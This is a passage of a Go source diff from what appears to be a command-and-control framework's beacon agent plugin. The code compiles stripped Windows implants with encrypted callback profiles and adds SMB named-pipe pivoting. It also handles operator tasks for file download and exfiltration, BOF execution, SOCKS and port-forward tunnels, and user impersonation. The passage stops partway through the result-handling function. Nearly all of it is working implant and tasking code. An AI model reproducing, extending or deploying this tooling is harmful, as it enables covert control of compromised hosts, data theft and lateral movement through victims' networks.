@@ -16,9 +16,10 @@ import (
 	"time"
 )
 
+var SetListeners = []string{"BeaconHTTP", "BeaconSMB"}
+
 const (
 	SetName            = "beacon"
-	SetListener        = "BeaconHTTP"
 	SetUiPath          = "_ui_agent.json"
 	SetCmdPath         = "_cmd_agent.json"
 	SetMaxTaskDataSize = 0x1900000 // 25 Mb
@@ -33,35 +34,44 @@ type GenerateConfig struct {
 	SvcName string `json:"svcname"`
 }
 
-var ObjectDir = "objects"
-var ObjectFiles = [...]string{"AgentConfig", "AgentInfo", "Agent", "ApiLoader", "beacon_functions", "Boffer", "Commander", "ConnectorHTTP", "Crypt", "Downloader", "Encoders", "JobsController", "MainAgent", "MemorySaver", "Packer", "ProcLoader", "Proxyfire", "std", "utils", "WaitMask"}
-var CFlag = "-c -fno-ident -fno-stack-protector -fno-exceptions -fno-asynchronous-unwind-tables -fno-strict-overflow -fno-delete-null-pointer-checks -fpermissive -w -masm=intel -fPIC"
-var LFlags = "-Os -s -Wl,-s,--gc-sections -static-libgcc -mwindows"
+var (
+	ObjectDir_http = "objects_http"
+	ObjectDir_smb  = "objects_smb"
+	ObjectFiles    = [...]string{"Agent", "AgentConfig", "AgentInfo", "ApiLoader", "beacon_functions", "Boffer", "Commander", "Crypt", "Downloader", "Encoders", "JobsController", "MainAgent", "MemorySaver", "Packer", "Pivotter", "ProcLoader", "Proxyfire", "std", "utils", "WaitMask"}
+	CFlag          = "-c -fno-builtin -fno-unwind-tables -fno-strict-aliasing -fno-ident -fno-stack-protector -fno-exceptions -fno-asynchronous-unwind-tables -fno-strict-overflow -fno-delete-null-pointer-checks -fpermissive -w -masm=intel -fPIC"
+	LFlags         = "-Os -s -Wl,-s,--gc-sections -static-libgcc -mwindows"
+)
 
-func AgentGenerateProfile(agentConfig string, listenerProfile []byte) ([]byte, error) {
+func AgentGenerateProfile(agentConfig string, listenerWM string, listenerMap map[string]any) ([]byte, error) {
 	var (
-		listenerMap    map[string]any
 		generateConfig GenerateConfig
 		err            error
 		params         []interface{}
 	)
-
-	err = json.Unmarshal(listenerProfile, &listenerMap)
-	if err != nil {
-		return nil, err
-	}
 
 	err = json.Unmarshal([]byte(agentConfig), &generateConfig)
 	if err != nil {
 		return nil, err
 	}
 
+	table := crc32.MakeTable(crc32.IEEE)
+	agentCrc := int(crc32.Checksum([]byte(SetName), table))
+
+	encrypt_key, _ := listenerMap["encrypt_key"].(string)
+	encryptKey, err := base64.StdEncoding.DecodeString(encrypt_key)
+	if err != nil {
+		return nil, err
+	}
+
+	seconds, err := parseDurationToSeconds(generateConfig.Sleep)
+	if err != nil {
+		return nil, err
+	}
+
 	protocol, _ := listenerMap["protocol"].(string)
+	switch protocol {
 
-	if protocol == "http" {
-
-		table := crc32.MakeTable(crc32.IEEE)
-		agentCrc := int(crc32.Checksum([]byte(SetName), table))
+	case "http":
 
 		portAgentStr, _ := listenerMap["callback_port"].(string)
 		PortAgent, _ := strconv.Atoi(portAgentStr)
@@ -83,12 +93,6 @@ func AgentGenerateProfile(agentConfig string, listenerProfile []byte) ([]byte, e
 		WebPageOutput, _ := listenerMap["page-payload"].(string)
 		ansOffset1 := strings.Index(WebPageOutput, "<<<PAYLOAD_DATA>>>")
 		ansOffset2 := len(WebPageOutput[ansOffset1+len("<<<PAYLOAD_DATA>>>"):])
-
-		encrypt_key, _ := listenerMap["encrypt_key"].(string)
-		encryptKey, err := base64.StdEncoding.DecodeString(encrypt_key)
-		if err != nil {
-			return nil, err
-		}
 
 		seconds, err := parseDurationToSeconds(generateConfig.Sleep)
 		if err != nil {
@@ -112,61 +116,82 @@ func AgentGenerateProfile(agentConfig string, listenerProfile []byte) ([]byte, e
 		params = append(params, seconds)
 		params = append(params, generateConfig.Jitter)
 
-		packedParams, err := PackArray(params)
-		if err != nil {
-			return nil, err
-		}
+	case "smb":
 
-		cryptParams, err := RC4Crypt(packedParams, encryptKey)
-		if err != nil {
-			return nil, err
-		}
+		pipename, _ := listenerMap["pipename"].(string)
+		pipename = "\\\\.\\pipe\\" + pipename
 
-		profileArray := []interface{}{len(cryptParams), cryptParams, encryptKey}
-		packedProfile, err := PackArray(profileArray)
-		if err != nil {
-			return nil, err
-		}
+		lWatermark, _ := strconv.ParseInt(listenerWM, 16, 64)
 
-		profileString := ""
-		for _, b := range packedProfile {
-			profileString += fmt.Sprintf("\\x%02x", b)
-		}
+		params = append(params, agentCrc)
+		params = append(params, pipename)
+		params = append(params, int(lWatermark))
+		params = append(params, seconds)
+		params = append(params, generateConfig.Jitter)
 
-		return []byte(profileString), nil
+	default:
+		return nil, errors.New("protocol unknown")
 	}
 
-	return nil, errors.New("protocol unknown")
+	packedParams, err := PackArray(params)
+	if err != nil {
+		return nil, err
+	}
+
+	cryptParams, err := RC4Crypt(packedParams, encryptKey)
+	if err != nil {
+		return nil, err
+	}
+
+	profileArray := []interface{}{len(cryptParams), cryptParams, encryptKey}
+	packedProfile, err := PackArray(profileArray)
+	if err != nil {
+		return nil, err
+	}
+
+	profileString := ""
+	for _, b := range packedProfile {
+		profileString += fmt.Sprintf("\\x%02x", b)
+	}
+
+	return []byte(profileString), nil
 }
 
-func AgentGenerateBuild(agentConfig string, agentProfile []byte) ([]byte, string, error) {
+func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map[string]any) ([]byte, string, error) {
 	var (
-		tempDir        string
-		currentDir     string
 		generateConfig GenerateConfig
+		ConnectorFile  string
+		ObjectDir      string
 		Compiler       string
 		Ext            string
-		Files          string
-		cmdConfig      string
-		cmdBuild       string
 		stubPath       string
-		buildPath      string
-		buildContent   []byte
 		Filename       string
-		err            error
+		buildPath      string
+		cmdConfig      string
 		stdout         bytes.Buffer
 		stderr         bytes.Buffer
 	)
 
-	err = json.Unmarshal([]byte(agentConfig), &generateConfig)
+	err := json.Unmarshal([]byte(agentConfig), &generateConfig)
 	if err != nil {
 		return nil, "", err
 	}
 
-	currentDir = PluginPath
-	tempDir, err = os.MkdirTemp("", "ax-*")
+	currentDir := PluginPath
+	tempDir, err := os.MkdirTemp("", "ax-*")
 	if err != nil {
 		return nil, "", err
+	}
+
+	protocol, _ := listenerMap["protocol"].(string)
+	if protocol == "http" {
+		ObjectDir = ObjectDir_http
+		ConnectorFile = "ConnectorHTTP"
+	} else if protocol == "smb" {
+		ObjectDir = ObjectDir_smb
+		ConnectorFile = "ConnectorSMB"
+	} else {
+		return nil, "", errors.New("protocol unknown")
 	}
 
 	if generateConfig.Arch == "x86" {
@@ -187,18 +212,23 @@ func AgentGenerateBuild(agentConfig string, agentProfile []byte) ([]byte, string
 	}
 
 	agentProfileSize := len(agentProfile) / 4
-	cmdConfig = fmt.Sprintf("%s %s %s/config.cpp -DSERVICE_NAME='\"%s\"' -DPROFILE='\"%s\"' -DPROFILE_SIZE=%d -o %s/config.o", Compiler, CFlag, ObjectDir, svcName, string(agentProfile), agentProfileSize, tempDir)
+	if generateConfig.Format == "Service Exe" {
+		cmdConfig = fmt.Sprintf("%s %s %s/config.cpp -DBUILD_SVC -DSERVICE_NAME='\"%s\"' -DPROFILE='\"%s\"' -DPROFILE_SIZE=%d -o %s/config.o", Compiler, CFlag, ObjectDir, svcName, string(agentProfile), agentProfileSize, tempDir)
+	} else {
+		cmdConfig = fmt.Sprintf("%s %s %s/config.cpp -DPROFILE='\"%s\"' -DPROFILE_SIZE=%d -o %s/config.o", Compiler, CFlag, ObjectDir, string(agentProfile), agentProfileSize, tempDir)
+	}
 	runnerCmdConfig := exec.Command("sh", "-c", cmdConfig)
 	runnerCmdConfig.Dir = currentDir
 	runnerCmdConfig.Stdout = &stdout
 	runnerCmdConfig.Stderr = &stderr
 	err = runnerCmdConfig.Run()
 	if err != nil {
-		os.RemoveAll(tempDir)
+		_ = os.RemoveAll(tempDir)
 		return nil, "", errors.New(string(stderr.Bytes()))
 	}
 
-	Files = tempDir + "/config.o "
+	Files := tempDir + "/config.o "
+	Files += ObjectDir + "/" + ConnectorFile + Ext + " "
 	for _, ofile := range ObjectFiles {
 		Files += ObjectDir + "/" + ofile + Ext + " "
 	}
@@ -222,26 +252,26 @@ func AgentGenerateBuild(agentConfig string, agentProfile []byte) ([]byte, string
 		buildPath = tempDir + "/file.dll"
 		Filename += ".bin"
 	} else {
-		os.RemoveAll(tempDir)
-		return nil, "", errors.New("Unknown file format")
+		_ = os.RemoveAll(tempDir)
+		return nil, "", errors.New("unknown file format")
 	}
 
-	cmdBuild = fmt.Sprintf("%s %s %s -o %s", Compiler, LFlags, Files, buildPath)
+	cmdBuild := fmt.Sprintf("%s %s %s -o %s", Compiler, LFlags, Files, buildPath)
 	runnerCmdBuild := exec.Command("sh", "-c", cmdBuild)
 	runnerCmdBuild.Dir = currentDir
 	runnerCmdBuild.Stdout = &stdout
 	runnerCmdBuild.Stderr = &stderr
 	err = runnerCmdBuild.Run()
 	if err != nil {
-		os.RemoveAll(tempDir)
+		_ = os.RemoveAll(tempDir)
 		return nil, "", err
 	}
 
-	buildContent, err = os.ReadFile(buildPath)
+	buildContent, err := os.ReadFile(buildPath)
 	if err != nil {
 		return nil, "", err
 	}
-	os.RemoveAll(tempDir)
+	_ = os.RemoveAll(tempDir)
 
 	if generateConfig.Format == "Shellcode" {
 		stubContent, err := os.ReadFile(stubPath)
@@ -264,7 +294,7 @@ func CreateAgent(initialData []byte) (AgentData, error) {
 	packer := CreatePacker(initialData)
 
 	if false == packer.CheckPacker([]string{"int", "int", "word", "word", "byte", "word", "word", "int", "byte", "byte", "int", "byte", "array", "array", "array", "array", "array"}) {
-		return agent, errors.New("Error agent data")
+		return agent, errors.New("error agent data")
 	}
 
 	agent.Sleep = packer.ParseInt32()
@@ -304,7 +334,6 @@ func CreateAgent(initialData []byte) (AgentData, error) {
 	agent.InternalIP = int32ToIPv4(internalIp)
 	agent.Os, agent.OsDesc = GetOsVersion(majorVersion, minorVersion, buildNumber, IsServer, systemArch)
 
-	agent.Async = true
 	agent.SessionKey = packer.ParseBytes()
 	agent.Domain = string(packer.ParseBytes())
 	agent.Computer = string(packer.ParseBytes())
@@ -351,6 +380,12 @@ func PackTasks(agentData AgentData, tasksArray []TaskData) ([]byte, error) {
 	return packData, nil
 }
 
+func PackPivotTasks(pivotId string, data []byte) ([]byte, error) {
+	id, _ := strconv.ParseInt(pivotId, 16, 64)
+	array := []interface{}{COMMAND_PIVOT_EXEC, int(id), len(data), data}
+	return PackArray(array)
+}
+
 func CreateTaskCommandSaveMemory(ts Teamserver, agentId string, buffer []byte) int {
 	chunkSize := 0x100000 // 1Mb
 	memoryId := int(rand.Uint32())
@@ -358,7 +393,7 @@ func CreateTaskCommandSaveMemory(ts Teamserver, agentId string, buffer []byte) i
 	bufferSize := len(buffer)
 
 	taskData := TaskData{
-		Type:    TASK,
+		Type:    TYPE_TASK,
 		AgentId: agentId,
 		Sync:    false,
 	}
@@ -377,7 +412,7 @@ func CreateTaskCommandSaveMemory(ts Teamserver, agentId string, buffer []byte) i
 		var taskBuffer bytes.Buffer
 		_ = json.NewEncoder(&taskBuffer).Encode(taskData)
 
-		ts.TsTaskQueueAddQuite(agentId, taskBuffer.Bytes())
+		ts.TsTaskCreate(agentId, "", "", taskBuffer.Bytes())
 	}
 	return memoryId
 }
@@ -390,7 +425,7 @@ func CreateTask(ts Teamserver, agent AgentData, command string, args map[string]
 	)
 
 	taskData = TaskData{
-		Type: TASK,
+		Type: TYPE_TASK,
 		Sync: true,
 	}
 
@@ -415,7 +450,6 @@ func CreateTask(ts Teamserver, agent AgentData, command string, args map[string]
 			goto RET
 		}
 		array = []interface{}{COMMAND_CAT, ConvertUTF8toCp(path, agent.ACP)}
-		break
 
 	case "cd":
 		path, ok := args["path"].(string)
@@ -424,7 +458,6 @@ func CreateTask(ts Teamserver, agent AgentData, command string, args map[string]
 			goto RET
 		}
 		array = []interface{}{COMMAND_CD, ConvertUTF8toCp(path, agent.ACP)}
-		break
 
 	case "cp":
 		src, ok := args["src"].(string)
@@ -439,11 +472,8 @@ func CreateTask(ts Teamserver, agent AgentData, command string, args map[string]
 		}
 		array = []interface{}{COMMAND_COPY, ConvertUTF8toCp(src, agent.ACP), ConvertUTF8toCp(dst, agent.ACP)}
 
-		break
-
 	case "disks":
 		array = []interface{}{COMMAND_DISKS}
-		break
 
 	case "download":
 		path, ok := args["file"].(string)
@@ -452,11 +482,10 @@ func CreateTask(ts Teamserver, agent AgentData, command string, args map[string]
 			goto RET
 		}
 		array = []interface{}{COMMAND_DOWNLOAD, ConvertUTF8toCp(path, agent.ACP)}
-		break
 
 	case "execute":
 		if subcommand == "bof" {
-			taskData.Type = JOB
+			taskData.Type = TYPE_JOB
 
 			bofFile, ok := args["bof"].(string)
 			if !ok {
@@ -482,7 +511,6 @@ func CreateTask(ts Teamserver, agent AgentData, command string, args map[string]
 			err = errors.New("subcommand must be 'bof'")
 			goto RET
 		}
-		break
 
 	case "exfil":
 		fid, ok := args["file_id"].(string)
@@ -506,7 +534,9 @@ func CreateTask(ts Teamserver, agent AgentData, command string, args map[string]
 			err = errors.New("subcommand must be 'cancel', 'start' or 'stop'")
 			goto RET
 		}
-		break
+
+	case "getuid":
+		array = []interface{}{COMMAND_GETUID}
 
 	case "jobs":
 		if subcommand == "list" {
@@ -529,7 +559,30 @@ func CreateTask(ts Teamserver, agent AgentData, command string, args map[string]
 			err = errors.New("subcommand must be 'list' or 'kill'")
 			goto RET
 		}
-		break
+
+	case "link":
+		if subcommand == "list" {
+			//array = []interface{}{COMMAND_PS_LIST}
+
+		} else if subcommand == "smb" {
+			target, ok := args["target"].(string)
+			if !ok {
+				err = errors.New("parameter 'target' must be set")
+				goto RET
+			}
+			pipename, ok := args["pipename"].(string)
+			if !ok {
+				err = errors.New("parameter 'pipename' must be set")
+				goto RET
+			}
+			pipe := fmt.Sprintf("\\\\%s\\pipe\\%s", target, pipename)
+
+			array = []interface{}{COMMAND_LINK, 1, pipe}
+
+		} else {
+			err = errors.New("subcommand must be 'list' or 'smb'")
+			goto RET
+		}
 
 	case "ls":
 		dir, ok := args["directory"].(string)
@@ -542,7 +595,7 @@ func CreateTask(ts Teamserver, agent AgentData, command string, args map[string]
 		array = []interface{}{COMMAND_LS, dir}
 
 	case "lportfwd":
-		taskData.Type = TUNNEL
+		taskData.Type = TYPE_TUNNEL
 
 		lportNumber, ok := args["lport"].(float64)
 		lport := int(lportNumber)
@@ -576,23 +629,23 @@ func CreateTask(ts Teamserver, agent AgentData, command string, args map[string]
 			if err != nil {
 				goto RET
 			}
-			messageData.Message = fmt.Sprintf("Started local port forwarding on %s:%d to %s:%d", lhost, lport, fhost, fport)
-			messageData.Status = MESSAGE_SUCCESS
-			messageData.Text = "\n"
+			taskData.Message = fmt.Sprintf("Started local port forwarding on %s:%d to %s:%d", lhost, lport, fhost, fport)
+			taskData.MessageType = MESSAGE_SUCCESS
+			taskData.ClearText = "\n"
 
 		} else if subcommand == "stop" {
-			taskData.Sync = false
+			taskData.Completed = true
+
 			ts.TsTunnelStopLocalPortFwd(agent.Id, lport)
 
-			messageData.Message = fmt.Sprintf("Local port forwarding on %d stopped", lport)
-			messageData.Status = MESSAGE_SUCCESS
-			messageData.Text = "\n"
+			taskData.Message = fmt.Sprintf("Local port forwarding on %d stopped", lport)
+			taskData.MessageType = MESSAGE_SUCCESS
+			taskData.ClearText = "\n"
 
 		} else {
 			err = errors.New("subcommand must be 'start' or 'stop'")
 			goto RET
 		}
-		break
 
 	case "mv":
 		src, ok := args["src"].(string)
@@ -607,8 +660,6 @@ func CreateTask(ts Teamserver, agent AgentData, command string, args map[string]
 		}
 		array = []interface{}{COMMAND_MV, ConvertUTF8toCp(src, agent.ACP), ConvertUTF8toCp(dst, agent.ACP)}
 
-		break
-
 	case "mkdir":
 		path, ok := args["path"].(string)
 		if !ok {
@@ -616,7 +667,6 @@ func CreateTask(ts Teamserver, agent AgentData, command string, args map[string]
 			goto RET
 		}
 		array = []interface{}{COMMAND_MKDIR, ConvertUTF8toCp(path, agent.ACP)}
-		break
 
 	case "profile":
 		if subcommand == "download.chunksize" {
@@ -632,7 +682,6 @@ func CreateTask(ts Teamserver, agent AgentData, command string, args map[string]
 			err = errors.New("subcommand for 'profile' not found")
 			goto RET
 		}
-		break
 
 	case "ps":
 		if subcommand == "list" {
@@ -647,7 +696,7 @@ func CreateTask(ts Teamserver, agent AgentData, command string, args map[string]
 			array = []interface{}{COMMAND_PS_KILL, int(pid)}
 
 		} else if subcommand == "run" {
-			taskData.Type = JOB
+			taskData.Type = TYPE_JOB
 
 			output, _ := args["-o"].(bool)
 			suspend, _ := args["-s"].(bool)
@@ -673,11 +722,12 @@ func CreateTask(ts Teamserver, agent AgentData, command string, args map[string]
 			err = errors.New("subcommand must be 'list', 'kill' or 'run'")
 			goto RET
 		}
-		break
 
 	case "pwd":
 		array = []interface{}{COMMAND_PWD}
-		break
+
+	case "rev2self":
+		array = []interface{}{COMMAND_REV2SELF}
 
 	case "rm":
 		path, ok := args["path"].(string)
@@ -686,10 +736,9 @@ func CreateTask(ts Teamserver, agent AgentData, command string, args map[string]
 			goto RET
 		}
 		array = []interface{}{COMMAND_RM, ConvertUTF8toCp(path, agent.ACP)}
-		break
 
 	case "rportfwd":
-		taskData.Type = TUNNEL
+		taskData.Type = TYPE_TUNNEL
 
 		lportNumber, ok := args["lport"].(float64)
 		lport := int(lportNumber)
@@ -724,22 +773,24 @@ func CreateTask(ts Teamserver, agent AgentData, command string, args map[string]
 			messageData.Text = "\n"
 
 		} else if subcommand == "stop" {
+			taskData.Completed = true
+
 			ts.TsTunnelStopRemotePortFwd(agent.Id, lport)
-			messageData.Status = MESSAGE_SUCCESS
-			messageData.Message = "Reverse port forwarding has been stopped"
-			messageData.Text = "\n"
+
+			taskData.MessageType = MESSAGE_SUCCESS
+			taskData.Message = "Reverse port forwarding has been stopped"
+			taskData.ClearText = "\n"
 
 		} else {
 			err = errors.New("subcommand must be 'start' or 'stop'")
 			goto RET
 		}
-		break
 
 	case "sleep":
 		var (
 			sleepTime  int
 			jitter     float64
-			jitterTime int = 0
+			jitterTime int
 			jitterOk   bool
 		)
 		sleep, sleepOk := args["sleep"].(string)
@@ -773,10 +824,9 @@ func CreateTask(ts Teamserver, agent AgentData, command string, args map[string]
 		}
 
 		array = []interface{}{COMMAND_PROFILE, 1, sleepTime, jitterTime}
-		break
 
 	case "socks":
-		taskData.Type = TUNNEL
+		taskData.Type = TYPE_TUNNEL
 
 		portNumber, ok := args["port"].(float64)
 		port := int(portNumber)
@@ -799,7 +849,7 @@ func CreateTask(ts Teamserver, agent AgentData, command string, args map[string]
 				if err != nil {
 					goto RET
 				}
-				messageData.Message = fmt.Sprintf("Socks4 server running on port %d", port)
+				taskData.Message = fmt.Sprintf("Socks4 server running on port %d", port)
 
 			} else {
 				auth, _ := args["-auth"].(bool)
@@ -818,34 +868,32 @@ func CreateTask(ts Teamserver, agent AgentData, command string, args map[string]
 					if err != nil {
 						goto RET
 					}
-					messageData.Message = fmt.Sprintf("Socks5 (with Auth) server running on port %d", port)
+					taskData.Message = fmt.Sprintf("Socks5 (with Auth) server running on port %d", port)
 
 				} else {
 					taskData.TaskId, err = ts.TsTunnelCreateSocks5(agent.Id, address, port, TunnelMessageConnectTCP, TunnelMessageConnectUDP, TunnelMessageWriteTCP, TunnelMessageWriteUDP, TunnelMessageClose)
 					if err != nil {
 						goto RET
 					}
-					messageData.Message = fmt.Sprintf("Socks5 server running on port %d", port)
+					taskData.Message = fmt.Sprintf("Socks5 server running on port %d", port)
 				}
 			}
-			messageData.Status = MESSAGE_SUCCESS
-			messageData.Text = "\n"
+			taskData.MessageType = MESSAGE_SUCCESS
+			taskData.ClearText = "\n"
 
 		} else if subcommand == "stop" {
 			taskData.Completed = true
 
 			ts.TsTunnelStopSocks(agent.Id, port)
 
-			messageData.Status = MESSAGE_SUCCESS
-			messageData.Message = "Socks5 server has been stopped"
-			messageData.Text = "\n"
+			taskData.MessageType = MESSAGE_SUCCESS
+			taskData.Message = "Socks5 server has been stopped"
+			taskData.ClearText = "\n"
 
 		} else {
 			err = errors.New("subcommand must be 'start' or 'stop'")
 			goto RET
 		}
-
-		break
 
 	case "terminate":
 		if subcommand == "thread" {
@@ -856,7 +904,22 @@ func CreateTask(ts Teamserver, agent AgentData, command string, args map[string]
 			err = errors.New("subcommand must be 'thread' or 'process'")
 			goto RET
 		}
-		break
+
+	case "unlink":
+		pivotName, ok := args["id"].(string)
+		if !ok {
+			err = errors.New("parameter 'id' must be set")
+			goto RET
+		}
+
+		pivotId, _, _ := ts.TsGetPivotInfoByName(pivotName)
+		if pivotId == "" {
+			err = fmt.Errorf("pivot %s does not exist", pivotName)
+			goto RET
+		}
+		id, _ := strconv.ParseInt(pivotId, 16, 64)
+
+		array = []interface{}{COMMAND_UNLINK, int(id)}
 
 	case "upload":
 		fileName, ok := args["remote_path"].(string)
@@ -879,8 +942,6 @@ func CreateTask(ts Teamserver, agent AgentData, command string, args map[string]
 
 		array = []interface{}{COMMAND_UPLOAD, memoryId, ConvertUTF8toCp(fileName, agent.ACP)}
 
-		break
-
 	default:
 		err = errors.New(fmt.Sprintf("Command '%v' not found", command))
 		goto RET
@@ -897,25 +958,27 @@ RET:
 	return taskData, messageData, err
 }
 
-func ProcessTasksResult(ts Teamserver, agentData AgentData, taskData TaskData, packedData []byte) {
+func ProcessTasksResult(ts Teamserver, agentData AgentData, taskData TaskData, packedData []byte) []TaskData {
+	var outTasks []TaskData
+
+	/// START CODE
 
 	packer := CreatePacker(packedData)
 
 	if false == packer.CheckPacker([]string{"int"}) {
-		return
+		return outTasks
 	}
 
 	size := packer.ParseInt32()
 	if size-4 != packer.Size() {
-		//fmt.Println("Invalid tasks data")
-		return
+		fmt.Println("Invalid tasks data")
+		return outTasks
 	}
 
 	for packer.Size() >= 8 {
-		var taskObject bytes.Buffer
 
 		if false == packer.CheckPacker([]string{"int", "int"}) {
-			return
+			return outTasks
 		}
 
 		TaskId := packer.ParseInt32()
@@ -927,30 +990,27 @@ func ProcessTasksResult(ts Teamserver, agentData AgentData, taskData TaskData, p
 
 		case COMMAND_CAT:
 			if false == packer.CheckPacker([]string{"array", "array"}) {
-				return
+				return outTasks
 			}
-			path := ConvertCpToUTF8(string(packer.ParseString()), agentData.ACP)
+			path := ConvertCpToUTF8(packer.ParseString(), agentData.ACP)
 			fileContent := packer.ParseBytes()
 			task.Message = fmt.Sprintf("'%v' file content:", path)
 			task.ClearText = string(fileContent)
-			break
 
 		case COMMAND_CD:
 			if false == packer.CheckPacker([]string{"array"}) {
-				return
+				return outTasks
 			}
-			path := ConvertCpToUTF8(string(packer.ParseString()), agentData.ACP)
+			path := ConvertCpToUTF8(packer.ParseString(), agentData.ACP)
 			task.Message = "Current working directory:"
 			task.ClearText = path
-			break
 
 		case COMMAND_COPY:
 			task.Message = "File copied successfully"
-			break
 
 		case COMMAND_DISKS:
 			if false == packer.CheckPacker([]string{"byte", "int"}) {
-				return
+				return outTasks
 			}
 			result := packer.ParseInt8()
 			var drives []ListingDrivesData
@@ -965,7 +1025,7 @@ func ProcessTasksResult(ts Teamserver, agentData AgentData, taskData TaskData, p
 
 				for i := 0; i < drivesCount; i++ {
 					if false == packer.CheckPacker([]string{"byte", "int"}) {
-						return
+						return outTasks
 					}
 					var driveData ListingDrivesData
 					driveCode := packer.ParseInt8()
@@ -998,68 +1058,63 @@ func ProcessTasksResult(ts Teamserver, agentData AgentData, taskData TaskData, p
 
 			SyncBrowserDisks(ts, task, drives)
 
-			break
-
 		case COMMAND_DOWNLOAD:
 			if false == packer.CheckPacker([]string{"int", "byte"}) {
-				return
+				return outTasks
 			}
 			fileId := fmt.Sprintf("%08x", packer.ParseInt32())
 			downloadCommand := packer.ParseInt8()
 			if downloadCommand == DOWNLOAD_START {
 				if false == packer.CheckPacker([]string{"int", "array"}) {
-					return
+					return outTasks
 				}
 				fileSize := packer.ParseInt32()
-				fileName := ConvertCpToUTF8(string(packer.ParseString()), agentData.ACP)
+				fileName := ConvertCpToUTF8(packer.ParseString(), agentData.ACP)
 				task.Message = fmt.Sprintf("The download of the '%s' file (%v bytes) has started: [fid %v]", fileName, fileSize, fileId)
 				task.Completed = false
-				ts.TsDownloadAdd(agentData.Id, fileId, fileName, int(fileSize))
+				_ = ts.TsDownloadAdd(agentData.Id, fileId, fileName, int(fileSize))
 
 			} else if downloadCommand == DOWNLOAD_CONTINUE {
 				if false == packer.CheckPacker([]string{"array"}) {
-					return
+					return outTasks
 				}
 				fileContent := packer.ParseBytes()
 				task.Completed = false
-				ts.TsDownloadUpdate(fileId, DOWNLOAD_STATE_RUNNING, fileContent)
+				_ = ts.TsDownloadUpdate(fileId, DOWNLOAD_STATE_RUNNING, fileContent)
 				continue
 
 			} else if downloadCommand == DOWNLOAD_FINISH {
 				task.Message = fmt.Sprintf("File download complete: [fid %v]", fileId)
-				ts.TsDownloadClose(fileId, DOWNLOAD_STATE_FINISHED)
+				_ = ts.TsDownloadClose(fileId, DOWNLOAD_STATE_FINISHED)
 			}
-			break
 
 		case COMMAND_EXFIL:
 			if false == packer.CheckPacker([]string{"int", "byte"}) {
-				return
+				return outTasks
 			}
 			fileId := fmt.Sprintf("%08x", packer.ParseInt32())
 			downloadState := packer.ParseInt8()
 
 			if downloadState == DOWNLOAD_STATE_STOPPED {
 				task.Message = fmt.Sprintf("Download '%v' successful stopped", fileId)
-				ts.TsDownloadUpdate(fileId, DOWNLOAD_STATE_STOPPED, []byte(""))
+				_ = ts.TsDownloadUpdate(fileId, DOWNLOAD_STATE_STOPPED, []byte(""))
 
 			} else if downloadState == DOWNLOAD_STATE_RUNNING {
 				task.Message = fmt.Sprintf("Download '%v' successful resumed", fileId)
-				ts.TsDownloadUpdate(fileId, DOWNLOAD_STATE_RUNNING, []byte(""))
+				_ = ts.TsDownloadUpdate(fileId, DOWNLOAD_STATE_RUNNING, []byte(""))
 
 			} else if downloadState == DOWNLOAD_STATE_CANCELED {
 				task.Message = fmt.Sprintf("Download '%v' successful canceled", fileId)
-				ts.TsDownloadClose(fileId, DOWNLOAD_STATE_CANCELED)
+				_ = ts.TsDownloadClose(fileId, DOWNLOAD_STATE_CANCELED)
 			}
-			break
 
 		case COMMAND_EXEC_BOF:
 			task.Message = "BOF finished"
 			task.Completed = true
-			break
 
 		case COMMAND_EXEC_BOF_OUT:
 			if false == packer.CheckPacker([]string{"int", "array"}) {
-				return
+				return outTasks
 			}
 
 			outputType := packer.ParseInt32()
@@ -1105,20 +1160,47 @@ func ProcessTasksResult(ts Teamserver, agentData AgentData, taskData TaskData, p
 			}
 
 			task.Completed = false
-			break
+
+		case COMMAND_GETUID:
+			if false == packer.CheckPacker([]string{"byte", "byte", "array", "array"}) {
+				return outTasks
+			}
+
+			gui := packer.ParseInt8()
+			high := packer.ParseInt8()
+			domain := ConvertCpToUTF8(packer.ParseString(), agentData.ACP)
+			username := ConvertCpToUTF8(packer.ParseString(), agentData.ACP)
+			message := ""
+			elevated := false
+
+			if username != "" {
+				if domain != "" {
+					username = domain + "\\" + username
+				}
+				message = fmt.Sprintf("You are '%v'", username)
+				if high > 0 {
+					message += " (elevated)"
+					elevated = true
+				}
+			}
+			task.Message = message
+
+			if gui > 0 {
+				_ = ts.TsAgentImpersonate(agentData.Id, username, elevated)
+			}
 
 		case COMMAND_JOB:
 			if false == packer.CheckPacker([]string{"byte"}) {
-				return
+				return outTasks
 			}
 
 			state := packer.ParseInt8()
 			if state == JOB_STATE_RUNNING {
 				if false == packer.CheckPacker([]string{"array"}) {
-					return
+					return outTasks
 				}
 				task.Completed = false
-				jobOutput := ConvertCpToUTF8(string(packer.ParseString()), agentData.OemCP)
+				jobOutput := ConvertCpToUTF8(packer.ParseString(), agentData.OemCP)
 				task.Message = fmt.Sprintf("Job [%v] output:", task.TaskId)
 				task.ClearText = jobOutput
 			} else if state == JOB_STATE_KILLED {
@@ -1129,12 +1211,11 @@ func ProcessTasksResult(ts Teamserver, agentData AgentData, taskData TaskData, p
 				task.Completed = true
 				task.Message = fmt.Sprintf("Job [%v] finished", task.TaskId)
 			}
-			break
 
 		case COMMAND_JOB_LIST:
 			var Output string
 			if false == packer.CheckPacker([]string{"int"}) {
-				return
+				return outTasks
 			}
 			count := packer.ParseInt32()
 
@@ -1143,7 +1224,7 @@ func ProcessTasksResult(ts Teamserver, agentData AgentData, taskData TaskData, p
 				Output += fmt.Sprintf(" %-10s  %-5s  %-13s", "--------", "-----", "-------")
 				for i := 0; i < int(count); i++ {
 					if false == packer.CheckPacker([]string{"int", "word", "word"}) {
-						return
+						return outTasks
 					}
 					jobId := fmt.Sprintf("%08x", packer.ParseInt32())
 					jobType := packer.ParseInt16()
@@ -1164,11 +1245,10 @@ func ProcessTasksResult(ts Teamserver, agentData AgentData, taskData TaskData, p
 			} else {
 				task.Message = "No active jobs"
 			}
-			break
 
 		case COMMAND_JOBS_KILL:
 			if false == packer.CheckPacker([]string{"byte", "int"}) {
-				return
+				return outTasks
 			}
 			result := packer.ParseInt8()
 			jobId := packer.ParseInt32()
@@ -1180,11 +1260,26 @@ func ProcessTasksResult(ts Teamserver, agentData AgentData, taskData TaskData, p
 				task.Message = fmt.Sprintf("Job %v mark as Killed", jobId)
 			}
 
-			break
+		case COMMAND_LINK:
+			if false == packer.CheckPacker([]string{"byte", "int", "array"}) {
+				return outTasks
+			}
+
+			linkType := packer.ParseInt8()
+			watermark := fmt.Sprintf("%08x", packer.ParseInt32())
+			beat := packer.ParseBytes()
+
+			childAgentId, _ := ts.TsListenerInteralHandler(watermark, beat)
+			_ = ts.TsPivotCreate(task.TaskId, agentData.Id, childAgentId, "", false)
+
+			if linkType == 1 {
